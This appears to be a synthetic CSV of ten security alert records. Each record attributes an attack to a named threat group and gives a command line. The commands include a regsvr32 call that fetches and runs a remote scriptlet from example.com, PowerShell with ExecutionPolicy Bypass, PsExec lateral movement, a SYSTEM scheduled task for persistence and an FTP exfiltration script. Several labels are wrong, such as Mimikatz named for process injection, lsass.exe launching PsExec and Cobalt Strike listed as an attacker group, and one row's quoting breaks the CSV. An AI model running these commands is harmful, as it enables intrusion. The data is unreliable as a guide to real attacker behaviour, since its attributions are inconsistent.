ID,Date,Time,Severity,Host,Source_IP,Attack,Attack_Details
7ca0a33f-20dc-4e50-b2dc-7c168be60f34,2023-01-02,10:30:01,High,HP1234F,192.168.1.100,APT29,"{""Tactic"": ""Command and Control"", ""Technique"": ""Domain Fronting"", ""Tool"": ""Cobalt Strike"", ""Process"": ""explorer.exe"", ""Command"": ""C:\Windows\System32\nslookup.exe 192.168.1.1 -t ANY""}"
8f55d5c9-1382-4295-8b8a-2a2dc7f74b1f,2023-01-03,08:20:00,Medium,DL4321A,192.168.1.102,FIN7,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""Process Injection"", ""Tool"": ""Mimikatz"", ""Process"": ""svchost.exe"", ""Command"": ""C:\Windows\System32\rundll32.exe C:\Users\Public\sample.dll,EntryPoint""}"
e8ddbd89-8409-4fcb-bd11-1e8c62ea290b,2023-01-05,14:20:10,High,HP1234B,192.168.1.104,APT32,"{""Tactic"": ""Initial Access"", ""Technique"": ""Spearphishing Attachment"", ""Tool"": ""Unknown"", ""Process"": ""winword.exe"", ""Command"": ""C:\Windows\System32\powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1""}"
f1406c53-6efc-479c-8791-ec77a31cf7a3,2023-01-06,13:45:00,Medium,HP4321F,192.168.1.107,SandWorm,"{""Tactic"": ""Lateral Movement"", ""Technique"": ""Pass the Ticket"", ""Tool"": ""PsExec"", ""Process"": ""lsass.exe"", ""Command"": ""C:\Windows\System32\psexec.exe -accepteula -s \\target-pc cmd.exe /c C:\Users\Public\sample.bat""}"
b0d1625b-0c3a-4227-8f18-f0f0a2341c54,2023-01-09,10:15:30,Low,DL1234C,192.168.1.110,APT33,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""DLL Side-Loading"", ""Tool"": ""Unknown"", ""Process"": ""notepad.exe"", ""Command"": ""C:\Program Files\Common Files\Microsoft Shared\Office16\FLUENT11.DLL""}"
c1d58af9-dc13-43a8-a0f5-d5d29b97a2b5,2023-01-10,09:55:45,Medium,HP5432F,192.168.1.113,Cobalt Strike,"{""Tactic"": ""Exfiltration"", ""Technique"": ""Exfiltration Over Command and Control Channel"", ""Tool"": ""Unknown"", ""Process"": ""cmd.exe"", ""Command"": ""C:\Windows\System32\ftp.exe -s:C:\Users\Public\ftpscript.txt""}"
f0d97f70-5d5c-401f-a5c5-0b5f77183d9e,2023-01-11,14:10:00,High,DL4321E,192.168.1.116,FIN10,"{""Tactic"": ""Persistence"", ""Technique"": ""Scheduled Task/Job"", ""Tool"": ""Unknown"", ""Process"": ""taskhost.exe"", ""Command"": ""C:\Windows\System32\schtasks.exe /Create /RU SYSTEM /TN "Task" /SC DAILY /TR "C:\Users\Public\payload.bat" /ST 12:00""}"
7e630e89-96ce-4a05-8659-6af3a6d46a6a,2023-01-14,10:30:01,High,HP1234G,192.168.1.100,APT29,"{""Tactic"": ""Command and Control"", ""Technique"": ""Domain Fronting"", ""Tool"": ""Cobalt Strike"", ""Process"": ""explorer.exe"", ""Command"": ""C:\Windows\System32\nslookup.exe example.com -t ANY""}"
e04430a2-1ca2-47f3-b48a-3c3c732819c3,2023-01-15,08:20:00,Medium,DL5432A,192.168.1.102,FIN7,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""Process Injection"", ""Tool"": ""Mimikatz"", ""Process"": ""winlogon.exe"", ""Command"": ""C:\Windows\System32\regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll""}"
0e8c080b-5c2c-460d-bad4-12d4f4dc4b4a,2023-01-18,14:20:10,High,HP5432K,192.168.1.104,APT32,"{""Tactic"": ""Initial Access"", ""Technique"": ""Spearphishing Attachment"", ""Tool"": ""Unknown"", ""Process"": ""powerpoint.exe"", ""Command"": ""C:\Windows\System32\cmd.exe /c C:\Users\Public\payload.bat""}"
